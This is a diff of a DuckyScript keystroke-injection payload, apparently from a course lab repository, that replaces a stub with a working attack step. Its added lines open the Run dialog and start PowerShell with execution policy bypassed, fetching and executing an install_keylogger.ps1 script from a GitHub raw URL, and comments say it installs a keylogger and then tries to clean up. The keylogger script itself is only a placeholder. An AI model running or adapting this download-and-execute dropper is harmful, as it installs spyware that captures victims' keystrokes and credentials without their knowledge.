@@ -1,12 +1,12 @@
-DELAY 5000
+REM This script downloads and runs a keylogger, then attempts cleanup.
+REM Ensure Python is installed on the target machine.
+REM IMPORTANT: Replace placeholder URLs with actual raw GitHub file URLs.
+
+DELAY 1000
 GUI r
 DELAY 500
-STRING cmd /k
+STRING powershell -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString(https://raw.githubusercontent.com/butlersl/305-lab-files/refs/heads/main/Keylogger/install_keylogger.ps1'))"
 ENTER
-DELAY 1000
-STRING echo "Starting Keylogger..." >> log.txt
-STRING echo "Press Ctrl+C to stop logging." >> log.txt
-REM --- Advanced scripting would go here to capture keys and send them ---
-REM --- This part is highly dependent on the OS and available tools ---
-REM --- For example, using PowerShell or Python scripts executed via DuckyScript ---
 
+REM --- install_keylogger.ps1 (PowerShell Script - to be hosted on GitHub) ---
+<contents of install_keylogger.ps1 will be detailed below>
